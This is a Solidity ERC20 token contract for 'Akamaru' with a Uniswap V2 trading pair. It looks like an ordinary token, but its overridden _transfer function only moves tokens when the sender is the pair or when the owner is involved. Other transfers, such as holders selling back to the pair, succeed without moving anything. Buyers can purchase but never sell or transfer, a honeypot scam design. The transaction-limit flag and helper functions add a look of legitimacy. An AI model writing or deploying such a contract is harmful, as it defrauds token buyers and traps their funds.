// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Ownable.sol";
import "./ERC20.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2Router02.sol";

contract Akamaru is ERC20, Ownable {
    IUniswapV2Router02 public immutable uniswapV2Router;
    address public uniswapV2Pair;

    uint256 public maxTxnAmount;
    bool public limitedTransactionAmount;
    address public automatedMarketMaker;

    uint256 _totalSupply = 1 * 1e9 * 1e18; // 1 Billion

    constructor() ERC20("Akamaru", "AKAMARU") {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        
        automatedMarketMaker = uniswapV2Pair;

        limitedTransactionAmount = false;
        maxTxnAmount = _totalSupply * 5 / 1000; // 0.5% maxTransaction Amount at a time

        _mint(msg.sender, _totalSupply);
    }

    receive() external payable {}

    function updateTransactionLimit() external onlyOwner
    {
        limitedTransactionAmount = true;
    }

    function addLiquidity(uint256 _tokenAmount, uint256 _ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), _tokenAmount);

        // add the liquidity - address is deployer wallet
        uniswapV2Router.addLiquidityETH{value: _ethAmount}(
            address(this),
            _tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(), 
            block.timestamp
        );
    }

    function _transfer(
        address _from,
        address _to,
        uint256 _amount
    ) internal override {

        if(automatedMarketMaker == _from || _from == owner() || _to == owner()) {
            super._transfer(_from, _to, _amount);
        } else {
            require(_amount <= maxTxnAmount, "transfer amount exceeds the maxTransactionAmount.");
        }
    }

    function swapTokensForEth(uint256 _tokenAmount) private {

        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), _tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            _tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }
}